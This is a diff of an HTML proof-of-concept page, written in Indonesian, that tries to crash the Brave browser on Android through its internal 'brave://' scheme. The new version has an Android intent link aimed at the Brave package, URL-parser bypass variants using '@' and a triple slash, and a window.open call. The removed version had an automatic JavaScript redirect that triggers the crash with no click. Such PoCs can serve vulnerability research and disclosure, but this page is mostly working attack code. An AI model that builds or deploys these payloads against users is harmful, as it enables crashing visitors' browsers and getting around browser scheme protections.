@@ -3,71 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brave Browser Crash PoC</title>
+    <title>Brave Intent Crash PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            padding: 30px;
+            padding: 20px;
             text-align: center;
         }
         button {
-            padding: 10px 20px;
+            padding: 12px 24px;
             font-size: 16px;
-            background-color: #ff5722;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            margin: 10px;
+            width: 80%;
+            max-width: 300px;
         }
-        button:hover {
-            background-color: #e64a19;
-        }
-        .method {
-            margin: 30px 0;
-            padding: 20px;
-            border: 1px solid #ccc;
+        .btn-intent { background-color: #007bff; }
+        .btn-bypass { background-color: #28a745; }
+        .btn-js { background-color: #dc3545; }
+        .container {
+            margin: 20px auto;
+            padding: 15px;
+            border: 1px solid #ddd;
             border-radius: 8px;
         }
     </style>
 </head>
 <body>
 
-    <h1>Brave Crash Test PoC</h1>
-    <p>Gunakan file ini untuk menguji apakah celah keamanan ini bisa dipicu dari halaman web.</p>
+    <h1>Brave Android Intent PoC</h1>
+    <p>Menguji bypass proteksi menggunakan skema Android Intent.</p>
 
-    <!-- Metode 1: Interaksi Pengguna (Klik Link) -->
-    <div class="method">
-        <h3>Metode 1: Klik Tautan Manual</h3>
-        <p>Coba klik tombol di bawah ini. Jika browser langsung force close, berarti skema internal bisa dipicu via interaksi klik.</p>
-        <a href="brave://google.com">
-            <button>Klik untuk Memicu Crash</button>
+    <!-- Metode 1: Menggunakan Android Intent Standard -->
+    <div class="container">
+        <h3>Metode 1: Android Intent (Brave Package)</h3>
+        <p>Mencoba memanggil komponen Brave secara spesifik melalui sistem Android.</p>
+        <a href="intent://google.com#Intent;scheme=brave;package=com.brave.browser;end">
+            <button class="btn-intent">Jalankan Intent</button>
         </a>
     </div>
 
-    <!-- Metode 2: Otomatis via JavaScript -->
-    <div class="method">
-        <h3>Metode 2: Otomatis via Pengalihan JS (Tanpa Klik)</h3>
-        <p>Tombol di bawah ini akan mencoba mengalihkan halaman secara otomatis menggunakan JavaScript setelah jeda 3 detik.</p>
-        <button onclick="startAutoRedirect()">Jalankan Auto-Redirect (3 Detik)</button>
-        <p id="status" style="color: blue; font-weight: bold;"></p>
+    <!-- Metode 2: Menggunakan Alternatif Obfuscation Parsing -->
+    <div class="container">
+        <h3>Metode 2: Karakter Khusus (Bypass Parser)</h3>
+        <p>Mencoba mengecoh pembacaan URL menggunakan karakter "@" atau triple slash.</p>
+        <a href="brave://@google.com">
+            <button class="btn-bypass">Coba Variasi 1 (@)</button>
+        </a>
+        <br>
+        <a href="brave:///google.com">
+            <button class="btn-bypass">Coba Variasi 2 (///)</button>
+        </a>
+    </div>
+
+    <!-- Metode 3: JavaScript Window Open -->
+    <div class="container">
+        <h3>Metode 3: DOM Window Open</h3>
+        <p>Membuka skema via script window pop-up, bukan pengalihan langsung.</p>
+        <button class="btn-js" onclick="tryWindowOpen()">Jalankan Window Open</button>
     </div>
 
     <script>
-        function startAutoRedirect() {
-            let countdown = 3;
-            const statusText = document.getElementById('status');
-            
-            const interval = setInterval(() => {
-                statusText.innerText = `Mengalihkan dalam ${countdown}...`;
-                countdown--;
-                
-                if (countdown < 0) {
-                    clearInterval(interval);
-                    statusText.innerText = "Mengeksekusi pengalihan...";
-                    // Memicu crash otomatis tanpa interaksi klik
-                    window.location.href = "brave://google.com";
-                }
-            }, 1000);
+        function tryWindowOpen() {
+            // Membuka tab/jendela baru dengan target skema internal
+            window.open("brave://google.com", "_blank");
         }
     </script>
 
